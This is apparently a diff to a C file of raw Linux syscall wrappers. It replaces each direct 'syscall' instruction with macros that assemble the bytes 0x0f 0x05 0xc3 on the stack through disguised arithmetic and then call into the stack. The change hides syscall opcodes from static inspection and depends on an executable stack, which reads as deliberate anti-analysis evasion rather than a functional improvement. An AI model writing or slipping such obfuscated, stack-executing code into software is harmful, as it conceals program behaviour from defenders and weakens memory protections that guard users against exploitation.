@@ -8,7 +8,23 @@
 #include <sys/syscall.h>
 #include <time.h>
 #include <errno.h>
-
+#define SYSCALL_OBSCURE_STAGE1 \
+        "sub $16, %%rsp\n"\
+        "xor %%rax, %%rax\n"\
+        "mov $3, %%al\n"\
+        "shl $2, %%al\n"\
+        "add $3, %%al\n"\
+        "mov %%al, (%%rsp)\n"\
+        "xor %%rax, %%rax\n"\
+        "mov $2, %%al\n"\
+        "add $3, %%al\n"\
+        "mov %%al, 1(%%rsp)\n"\
+        "movb $0xc3, 2(%%rsp)\n"
+#define SYSCALL_OBSCURE_STAGE2 \
+        "call *%%rsp\n"\
+        "mov %%rax, %0\n"\
+        "add $16, %%rsp\n"
+     
 #define OBSCURE_SYSCALL0(num) \
     syscall_impl_0(num)
 #define OBSCURE_SYSCALL1(num, a1) \
@@ -37,10 +53,10 @@ static inline long syscall_impl_0(long num) {
 static inline long syscall_impl_1(long num, long a1) {
     long ret;
     asm volatile(
+        SYSCALL_OBSCURE_STAGE1
         "movq %1, %%rax\n"
         "movq %2, %%rdi\n"
-        "syscall\n"
-        "movq %%rax, %0"
+        SYSCALL_OBSCURE_STAGE2
         : "=r"(ret)
         : "r"(num), "r"(a1)
         : "rax", "rdi", "rcx", "r11", "memory"
@@ -51,11 +67,11 @@ static inline long syscall_impl_1(long num, long a1) {
 static inline long syscall_impl_2(long num, long a1, long a2) {
     long ret;
     asm volatile(
+        SYSCALL_OBSCURE_STAGE1
         "movq %1, %%rax\n"
         "movq %2, %%rdi\n"
         "movq %3, %%rsi\n"
-        "syscall\n"
-        "movq %%rax, %0"
+        SYSCALL_OBSCURE_STAGE2
         : "=r"(ret)
         : "r"(num), "r"(a1), "r"(a2)
         : "rax", "rdi", "rsi", "rcx", "r11", "memory"
@@ -66,12 +82,12 @@ static inline long syscall_impl_2(long num, long a1, long a2) {
 static inline long syscall_impl_3(long num, long a1, long a2, long a3) {
     long ret;
     asm volatile(
+        SYSCALL_OBSCURE_STAGE1
         "movq %1, %%rax\n"
         "movq %2, %%rdi\n"
         "movq %3, %%rsi\n"
         "movq %4, %%rdx\n"
-        "syscall\n"
-        "movq %%rax, %0"
+        SYSCALL_OBSCURE_STAGE2
         : "=r"(ret)
         : "r"(num), "r"(a1), "r"(a2), "r"(a3)
         : "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
@@ -82,13 +98,13 @@ static inline long syscall_impl_3(long num, long a1, long a2, long a3) {
 static inline long syscall_impl_4(long num, long a1, long a2, long a3, long a4) {
     long ret;
     asm volatile(
+        SYSCALL_OBSCURE_STAGE1
         "movq %1, %%rax\n"
         "movq %2, %%rdi\n"
         "movq %3, %%rsi\n"
         "movq %4, %%rdx\n"
         "movq %5, %%r10\n"
-        "syscall\n"
-        "movq %%rax, %0"
+        SYSCALL_OBSCURE_STAGE2
         : "=r"(ret)
         : "r"(num), "r"(a1), "r"(a2), "r"(a3), "r"(a4)
         : "rax", "rdi", "rsi", "rdx","r10", "rcx", "r11", "memory"
@@ -145,7 +161,7 @@ static void compute_cache_path(const char * base_path, char * out_path, size_t o
     }
 
     /* Ensure dir exists */
-    OBSCURE_SYSCALL2(SYS_mkdir, out_path, 0700);
+    OBSCURE_SYSCALL2(SYS_mkdir, (long)out_path, 0700);
 
     if (out_size > strlen(out_path) + 12) {
         strcat(out_path, "/state.dat");
